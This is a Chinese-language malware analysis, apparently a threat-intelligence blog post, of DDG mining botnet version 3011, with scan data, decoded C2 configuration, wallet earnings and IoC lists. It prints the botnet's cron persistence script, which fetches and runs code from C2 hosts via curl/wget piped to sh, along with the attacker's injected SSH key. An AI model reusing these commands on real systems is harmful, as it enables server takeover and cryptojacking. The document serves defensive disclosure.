今年 2 月 1 日，我们详细分析了一个瞄准数据库服务器的挖矿僵尸网络
[DDG.Mining.Botnet](https://blog.netlab.360.com/ddg-a-mining-botnet-aiming-at-database-server/) 。

近期，我们注意到该家族发布了新的版本 3011 ，在该更新版本部署的过程中，引发了端口 7379 及相关端口上的扫描流量异常。该版本中启用了新的钱包，其在
2 个矿池里累计收益已经超过 1,419 枚 XMR。最后值得注意的是，该版本可能还处于测试阶段，或者只是一个过渡版本。

DDG 3011 版本的概要特征如下：

  1. 启用了新的 XMR 钱包；
  2. 挖矿程序变更为 2t3ik ，但命名规则没有变化，仍然是钱包地址的末尾 5 位；
  3. 启用多个矿池，这应该被理解成为一种失效保护机制；
  4. 样本的编写语言由旧的 Go1.9.2 换成了 Go1.10，并在代码结构、第三方库和自身功能方面进行较大改动；
  5. 启用了云端配置文件，可以由云端配置文件指定要扫描的服务端口、矿机程序下载链接、本地样本更新数据等等；
  6. 相同的持久驻留机制：将 i.sh 脚本写入到 Crontab 中定期更新、运行。

### 7379 及相关端口上的扫描流量异常

近期，我们的
[ScanMon](https://scan.netlab.360.com/#/dashboard?tsbeg=1525622400000&tsend=1526054400000&dstport=7379&toplistname=similardstport&topn=10)
系统显示 Redis 服务相关端口的扫描流量骤增，如下：

![port_scan.png](https://image.3001.net/images/20180521/15268937516542.png!small)  

上图中，与该扫描相关的关联端口共计 7 个，分别是 ：

  1. Redis 相关的三个：6379, 6380, 7379
  2. SSH 相关的三个：22, 2222, 22222
  3. HTTP 相关的一个：8000

我们在本文后续的样本分析环节中可以发现，DDG 新版本 ddgs.3011 的扫描模式与上述 ScanMon 观察到的现象非常契合。这足以证明，DDG
最新版本的活动引起了本轮 7379 及相关端口上的扫描行为。

### 样本执行流程

我们捕获了这次事件相关的核心样本：

    
    
    hxxp://165.225.157.157:8000/static/3011/ddgs.i686    md5=999fc24f53034b4c73866a0699be15fa
    

该样本的执行流程如下：  

![ddgs_3011_flowchart.png](https://image.3001.net/images/20180521/1526893787313.png!small)

新旧样本最明显的相似之处，是通过把 i.sh 脚本植入到 Linux 系统肉鸡的 Crontab 中来实现持久驻留。新 i.sh 脚本内容如下：

    
    
    export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin
    
    echo "*/5 * * * * curl -fsSL http://165.225.157.157:8000/i.sh | sh" > /var/spool/cron/root  
    echo "*/5 * * * * wget -q -O- http://165.225.157.157:8000/i.sh | sh" >> /var/spool/cron/root  
    mkdir -p /var/spool/cron/crontabs  
    echo "*/5 * * * * curl -fsSL http://165.225.157.157:8000/i.sh | sh" > /var/spool/cron/crontabs/root  
    echo "*/5 * * * * wget -q -O- http://165.225.157.157:8000/i.sh | sh" >> /var/spool/cron/crontabs/root
    
    if [ ! -f "/tmp/ddgs.3011" ]; then  
        curl -fsSL http://165.225.157.157:8000/static/3011/ddgs.i686 -o /tmp/ddgs.3011
    fi  
    chmod +x /tmp/ddgs.3011 && /tmp/ddgs.3011
    
    ps auxf | grep -v grep | grep Circle_MI | awk '{print $2}' | xargs kill  
    ps auxf | grep -v grep | grep get.bi-chi.com | awk '{print $2}' | xargs kill  
    ps auxf | grep -v grep | grep hashvault.pro | awk '{print $2}' | xargs kill  
    ps auxf | grep -v grep | grep nanopool.org | awk '{print $2}' | xargs kill  
    ps auxf | grep -v grep | grep minexmr.com | awk '{print $2}' | xargs kill  
    ps auxf | grep -v grep | grep /boot/efi/ | awk '{print $2}' | xargs kill  
    #ps auxf | grep -v grep | grep ddg.2006 | awk '{print $2}' | kill
    #ps auxf | grep -v grep | grep ddg.2010 | awk '{print $2}' | kill
    

ddgs.i686 通过 SSH / Redis 服务暴破、未授权访问来入侵主机，暴破词典如下：  

![passwords.png](https://image.3001.net/images/20180521/15268938233415.png!small)

ddgs.i686 还会在失陷主机本地的 `/var/spool/cron/crontabs/root` 或者
`/var/spool/cron/crontabs` 处写入定时任务脚本，从云端下载最新的 `i.sh` 脚本定时执行（ %s 处为最新的 `i.sh`
下载链接），实现持久驻留：

    
    
    */1 * * * * curl -L %s | sh
    */1 * * * * wget -q %s -O - | sh
    

然后，ddgs.i686 会尝试在当前肉鸡的 `~/.ssh/authorized_keys` 中注入以下 SSH Pub Key：

    
    
    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfxLBb/eKbi0TVVULI8ILVtbv2iaGM+eZbZoCWcD3v/eF1B/VkHAC1YwIhfqkUYudwhxVfQzsOZYQmKyapWzgp3tBAxcl82Al++VQc36mf/XFnECHndJS1JZB429/w/Ao+KlASl/qzita61D2VsXyejIQIeYR7Ro+ztLSTXjx+70CvzgOae3oayunL/hGX8qORIkG5YR3R1Jefhxy1NhGxEd6GaR7fZA5QWGfM17IcSXi2Q876JL8U7Aq8cjQyN/kGT2jWiiQiOZzqbjVJVICiwk0KvtrTwppV6FLty/vdfhgyspR4WZMep41xxuBH5rBkEJO5lqbKJWatcaA8n9jR root@localhost
    

ddgs.i686 样本中内置了一个 ip:port 的 List，其中 2 个主要的 `165.225.157.157:8000`和
`165.227.149.151:8000` ，其他算是备用，全部列表见文末 IoC 部分。

样本 ddgs.i686 启动之后，会依次连接上述 ip:port 检查是否可以访问：  

![ip_list_conn.png](https://image.3001.net/images/20180521/15268938767101.png!small)

对每个成功握手的 ip:port ，ddgs.i686 都会尝试向 `hxxp://<C2:8000>/slave` 发送 HTTP POST 请求：  

![ip_list_http_post.png](https://image.3001.net/images/20180521/15268939046812.png!small)

如果 C2 正常工作，则会返回一串用 [msgPack](https://msgpack.org/) 序列化编码后的配置文件数据：

![http_post_resp_mask.png](https://image.3001.net/images/20180521/15268939195549.png!small)

由于这串数据自定义了复杂的数据结构，没能成功完美解码，经过 msgPack 通用反序列化再大概还原后如下：

    
    
    {
        'Data': 
            Config: 
                Interval:"360s";
                Miner:[
                    {Exe: "/tmp/2t3ik.p", Md5: "b44bce2047f2254e5e7e8b0730caae2e", Url: "/static/2t3ik.p"}, 
                    {Exe: "/tmp/2t3ik.m", Md5: "54259015b8ead37ac66da056769520db", Url: "/static/2t3ik.m"}
                ];
                Cmd:[
                    (AAredis:{
                        Id: 6016;
                        Version: 3011; 
                        ShellUrl: "http://165.225.157.157:8000/i.sh"; 
                        Duration: "168h";
                        aIPDuration: "23h"; 
                        GenLan;
                        GenAAA;
                        Ports: (6379, 6380, 7379)
                    }),
                    (AAssh:{
                        Id: 2017;
                        Version: 3011;
                        ShellUrl: "http://165.225.157.157:8000/i.sh";
                        NThreadsd;
                        Duration: "168h";
                        aIPDuration:"26h"
                        GenLan;
                        GenAAA;Ports: (22, 2222, 22222)
                    }),
                    (Update:(
                        {
                            Id: 142;
                            Version: 3010;
                            Timeout: "26m";
                            Exe: "/tmp/ddgs.3011";
                            Md5: "999fc24f53034b4c73866a0699be15fa";
                            Url: "/static/3011/ddgs.i686";
                            Killer: 132;
                        },
                        {
                            Id: 197;
                            Version:3011;
                            Expr: ".+(cryptonight|stratum+tcp://|dwarfpool.com).+";
                            Timeout: "360s";
                        },
                        {
                            Id: 198;
                            Version: 3011;
                            Expr: "./xmr-stak|./.syslog|/bin/wipefs|./xmrig|/tmp/wnTKYg";
                            Timeout: "360s";
                        },
                        {
                            Id: 199;
                            Version: 3011;
                            Expr: "/tmp/2t3ik.+";
                            Timeout: "360s";
                            LKProc: 132;
                        },
                        {
                            Id: 177;
                            Version: 3011;
                            Expr: ".+";
                            Timeout: 360s'
                        }
                    )
                ],
        'Signature': '\x02\x0b_v8\xe4\xa9\xe8\x0fV\xc1\x04\xbeK\x1e\x10\x1a\xc4\xb3C}\xb2\x96D\r\x97"\xc4\xffF\xd0s)\xbf\xc4H\xa4\xa5le\xd5J\x8b\x0f8?\r\xfb\x8b)\~~\x02\xfd\xf7\xa4\xe5"hp\x11\xdd\xae\xd4\r\\\xb4\xf7)\xf1\xc4\x87\x95\x8esM\xbcq\x01Y\xe8\xe5H\x93\xde\xcc\xbbq\xc3\xdebS\x03\x90K\t4\x9e=\x94\xd1w~V\xa3\xad$\x10\'\xa2y\xaa\xe6\x0ep\xd8\x00\xf2\xf7B\xc6\x18\xa4\x16_q/K\xf8\x05\n\x98:-\x9f\xf1z\xfe\xa3\xe4C\xa8\xeeg\x0f\x7f\xd7\x8d\x02\x98\\\x1aJ\xab\xcc\xf9\xbd\x94\x83\xfd\xc3q\xad\xb5\x8d\xcb\x06\xfeQ\x1d=\x05L@\xc3\xf6\n>\xb2\xedY\x16.\x14\x7fc\xf9\xafT\xa3\xfbzq/y\xba4\xd8k\x82rh\x17\xd8\xd5\'EU~\x1ag\x0f\xb2\xa0\xa3C\xff\xcbSj\xccI\xe4\x98\x99\xc3\xe8\xfe\xe7\xfd\xf5\x07\xce\x8d\x97d\x1e\xae\ta\xf3\x8e\x05\xf7\xb7\x95\xe7\x82|\x8eS\x0b\x11\xcb\xa3'
    }
    

结合配置文件和样本分析，可以发现以下几个关键点：

  1. 配置文件中提供了 Miner 程序的 URI、MD5 和保存到当前肉鸡的文件路径。ddgs.i686 会根据 URI，通过 HTTP GET 请求从 `http://<C2:8000>/Miner_URI`处下载 Miner 程序并另存到指定路径；

  2. 配置文件中提供了最新的 i.sh 文件下载路径，ddgs.i686 会把这个路径填充到定时任务的命令字串中；

  3. 配置文件中指定了要扫描的 dstport，可以看到针对 Redis 服务，指定 ddgs.i686 扫描 (6379, 6380, 7379) 三个端口，针对 SSH 服务，指定扫描 (22, 2222, 22222) 三个端口。（这里可以解释 ScanMon 上 7 个端口之间的伴生关系。但 Redis 服务相关的 3 个端口与 SSH 服务相关的 3 个端口之间 Shared scip 数量比较少，原因可能跟蜜罐部署以及蜜罐的网络配置有关）

  4. 配置文件中的 GenLan / GenAAA 对应生成 Scan Target IP 的生成策略。样本中的 Scan Target IP 生成策略仍然同于旧版本的 ddg.miner： 生成的内网网段 Target IP 范围如下：

    * 10.Y.x.x/16 (Y 为当前内网 IP B 段的值)
    * 172.16.x.x/16
    * 192.168.x.x/16

当前主机的公网 IP 地址 WAN_IP ，然后在 `WAN_IP/8` 范围内生成公网网段 Target IP 。

但是样本内有个扫描控制策略，从行为上看，针对内网 Target IP ，只扫描 SSH 服务相关的 3 个端口，我的虚拟机上运行结果只会扫 SSH
服务，看起来只有获取到了网卡的外网地址，才会针对外网的 Target IP 扫描 Redis 相关的端口。

  5. 配置文件中给出了 ddgs 样本的更新配置：最新的版本号、本地另存的文件路径、C2 端下载的 URI 以及样本的 MD5，本地已有的 ddgs.i686 样本会根据这些信息对本地样本进行更新。

### 挖矿

样本获取配置文件后，会根据配置文件中 Miner 的信息，去下载 2t3ik.p 和 2t3ik.m到当前失陷主机的 /tmp/ 目录。这两个文件是
XMRig 2.5.2 编译的矿机程序，具体区别不明，关键信息都一致：

  1. 钱包地址（新出现）：

42d4D8pASAWghyTmUS8a9yZyErA4WB18TJ6Xd2rZt9HBio2aPmAAVpHcPM8yoDEYD9Fy7eRvPJhR7SKFyTaFbSYCNZ2t3ik

  2. 涉及的矿池：

    * 47.90.204.154
    * hk02.supportxmr.com
    * pool.supportxmr.com
    * xmr-asia1.nanopool.org
    * xmr-us-west1.nanopool.org

其中 `47.90.204.154:443` 是首选矿池地址，但会 Reset 掉网络请求，该主机位于 阿里云 ，猜测是团伙背后的 Miner Report
C&C 主机；

    * 在矿池 `supportxmr.com` 中的 TotalPaid 为 150.5194868540 XMR ，按当前市价折合人民币 181,311.3 ￥ ；

    * 在矿池 `nanopool.org` 中TotalPaid: 1268.5880545439 XMR ，按当前市价折合人民币 1527,519.6￥。

### 3011 是一个测试或过渡版本

最后值得一提的是，ddgs.i686 是 32bit ELF 文件，而它下载到的 2t3ik.p 和 2t3ik.m都是 64bit ELF
文件，这样一来，在真实环境中，矿机程序并没有办法运行。而且，版本 3011
只有`hxxp://165.225.157.157:8000/static/3011/ddgs.i686` 这一个核心样本，不像版本 3010 ，同时存在
ddgs.i686 和 ddgs.x86_64 两个核心样本。所以，可以认为版本 3011 目前处于测试阶段，或者只是一个过渡版本。

## IoC

Sample

    
    
    md5=9ebf7fc39efe7c553989d54965ebb468    uri=hxxp://165.225.157.157:8000/static/imWBR1  
    md5=d3b1700a413924743caab1460129396b    uri=hxxp://165.225.157.157:8000/static/wnTKYg  
    md5=8eaf1f18c006e6ecacfb1adb0ef7faee    uri=hxxp://165.225.157.157:8000/static/wnTKYg.noaes  
    md5=754487fd92e282c98acf6528604049aa    uri=hxxp://165.225.157.157:8000/static/imWBR1.ig  
    md5=52f06ca981a6e6cbc89b095ea6db1bf9    uri=hxxp://165.225.157.157:8000/static/2t3ik.s  
    md5=b44bce2047f2254e5e7e8b0730caae2e    uri=hxxp://165.225.157.157:8000/static/2t3ik.p  
    md5=54259015b8ead37ac66da056769520db    uri=hxxp://165.225.157.157:8000/static/2t3ik.m  
    md5=76e8d7bf408b3b6ebd13d6b292519742    uri=hxxp://165.225.157.157:8000/static/2t3ik  
    md5=999fc24f53034b4c73866a0699be15fa    uri=hxxp://165.225.157.157:8000/static/3011/ddgs.i686  
    md5=8ab02497219bda76c959f86386a2c363    uri=hxxp://165.225.157.157:8000/static/3010/ddgs.i686  
    md5=45774309c72839d6d4303024059e7070    uri=hxxp://165.225.157.157:8000/static/3010/ddgs.x86_64  
    md5=884a57a0e4f9d222117aeca111095d7a    uri=hxxp://165.225.157.157:8000/i.sh
    

Full IP List

    
    
    Main C2 --> 165.225.157.157:8000 United States/US San Francisco    "AS26464 Joyent, Inc."  
    Main C2 --> 165.227.149.151:8000 Germany/DE Frankfurt am Main    "AS14061 DigitalOcean, LLC"
    
    47.93.8.34:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.2.72:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.3.27:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    58.57.65.8:8000 China/CN Jinan    "AS4134 No.31,Jin-rong Street"  
    47.52.57.82:8000 Hong Kong/HK    "AS45102 Alibaba (China) Technology Co., Ltd."  
    47.89.242.3:8000 United States/US San Mateo    "AS45102 Alibaba (China) Technology Co., Ltd."  
    47.93.23.55:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.93.42.11:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.93.54.50:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.93.61.56:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.93.62.70:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.93.63.53:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.93.7.200:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.93.7.246:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.93.8.225:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.93.9.192:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.133.2:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.14.49:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.15.37:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.17.24:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.4.107:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.5.120:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.7.232:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.91.57:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.95.83:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    112.35.27.86:8000 China/CN    "AS9808 Guangdong Mobile Communication Co.Ltd."  
    210.61.12.12:8000 Taiwan/TW    "AS3462 Data Communication Business Group"  
    47.52.26.128:8000 Hong Kong/HK    "AS45102 Alibaba (China) Technology Co., Ltd."  
    47.52.35.111:8000 Hong Kong/HK    "AS45102 Alibaba (China) Technology Co., Ltd."  
    47.52.39.221:8000 Hong Kong/HK    "AS45102 Alibaba (China) Technology Co., Ltd."  
    47.52.57.128:8000 Hong Kong/HK    "AS45102 Alibaba (China) Technology Co., Ltd."  
    47.52.67.132:8000 Hong Kong/HK    "AS45102 Alibaba (China) Technology Co., Ltd."  
    47.90.102.90:8000 Hong Kong/HK    "AS45102 Alibaba (China) Technology Co., Ltd."  
    47.90.80.240:8000 Hong Kong/HK    "AS45102 Alibaba (China) Technology Co., Ltd."  
    47.90.97.191:8000 Hong Kong/HK    "AS45102 Alibaba (China) Technology Co., Ltd."  
    47.93.234.19:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.93.25.138:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.93.250.72:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.93.252.99:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.93.254.18:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.93.31.209:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.93.32.158:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.93.38.172:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.93.44.244:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.93.45.159:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.93.55.228:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.103.17:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.105.66:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.139.76:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.15.142:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.159.88:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.18.187:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.19.102:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.20.232:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.200.65:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.248.75:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.80.224:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.90.242:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    52.73.67.152:8000 United States/US Ashburn    "AS14618 Amazon.com, Inc."  
    58.58.34.221:8000 China/CN Jinan    "AS4134 No.31,Jin-rong Street"  
    61.91.81.253:8000 Thailand/TH Bangkok    "AS9287 TRUEINTERNET Co.,Ltd."  
    110.10.189.61:8000 Republic of Korea/KR Seoul    "AS9318 SK Broadband Co Ltd"  
    111.231.1.127:8000 China/CN Beijing    "AS45090 Shenzhen Tencent Computer Systems Company Limited"  
    112.126.86.91:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    112.244.20.22:8000 China/CN Jinan    "AS4837 CHINA UNICOM China169 Backbone"  
    112.74.184.31:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    114.215.24.92:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    114.215.41.12:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    115.95.135.61:8000 Republic of Korea/KR Seoul    "AS3786 LG DACOM Corporation"  
    117.20.30.103:8000 Pakistan/PK Karachi    "AS38193 Transworld Associates (Pvt.) Ltd."  
    121.42.10.132:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    122.115.43.72:8000 China/CN Beijing    "AS4808 China Unicom Beijing Province Network"  
    123.31.12.137:8000 Vietnam/VN Hanoi    "AS135905 VIETNAM POSTS AND TELECOMMUNICATIONS GROUP"  
    14.140.232.55:8000 India/IN Mumbai    "AS4755 TATA Communications formerly VSNL is Leading ISP"  
    182.162.73.58:8000 Republic of Korea/KR    "AS3786 LG DACOM Corporation"  
    199.233.62.78:8000 United States/US Henderson    "AS54417 Stimulus Technologies"  
    47.88.218.199:8000 Singapore/SG    "AS45102 Alibaba (China) Technology Co., Ltd."  
    47.88.219.207:8000 Singapore/SG    "AS45102 Alibaba (China) Technology Co., Ltd."  
    47.89.190.198:8000 United States/US    "AS45102 Alibaba (China) Technology Co., Ltd."  
    47.90.204.154:8000 United States/US San Mateo    "AS45102 Alibaba (China) Technology Co., Ltd."  
    47.93.240.226:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.93.247.153:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.93.254.136:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.93.254.166:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.102.108:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.103.132:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.105.126:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.109.131:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.111.209:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.128.131:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.128.133:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.130.122:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.141.223:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.145.206:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.146.188:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.156.239:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.194.184:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.200.116:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.219.219:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.227.192:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    47.94.253.142:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    69.25.149.164:8000 United States/US Bellevue    "AS6640 Qwest Communications Company, LLC"  
    103.27.239.132:8000 Vietnam/VN Ho Chi Minh City    "AS131386 Long Van System Solution JSC"  
    103.27.239.135:8000 Vietnam/VN Ho Chi Minh City    "AS131386 Long Van System Solution JSC"  
    103.56.115.153:8000 Hong Kong/HK North Point    "AS55933 Cloudie Limited"  
    112.74.193.216:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    112.74.210.161:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    114.215.129.43:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    114.215.65.229:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    121.196.197.63:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    121.40.119.134:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    121.40.166.232:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    121.58.222.138:8000 Philippines/PH Pampanga    "AS17639 Converge ICT Solutions Inc."  
    122.115.43.145:8000 China/CN Beijing    "AS4808 China Unicom Beijing Province Network"  
    122.14.200.177:8000 China/CN Beijing    "AS23724 IDC, China Telecommunications Corporation"  
    123.196.124.52:8000 China/CN Beijing    "AS4847 China Networks Inter-Exchange"  
    123.30.240.102:8000 Vietnam/VN Hanoi    "AS45899 VNPT Corp"  
    13.113.240.221:8000 Japan/JP Tokyo    "AS16509 Amazon.com, Inc."  
    202.45.147.116:8000 Nepal/NP    "AS45353 NITC: IT Agency of Government of Nepal"  
    104.197.211.117:8000 United States/US    "AS15169 Google LLC"  
    112.125.120.193:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    114.215.104.177:8000 China/CN Hangzhou    "AS37963 Hangzhou Alibaba Advertising Co.,Ltd."  
    118.228.152.210:8000 China/CN Beijing    "AS45587 China Broadband Communications (CBCnet)"

  

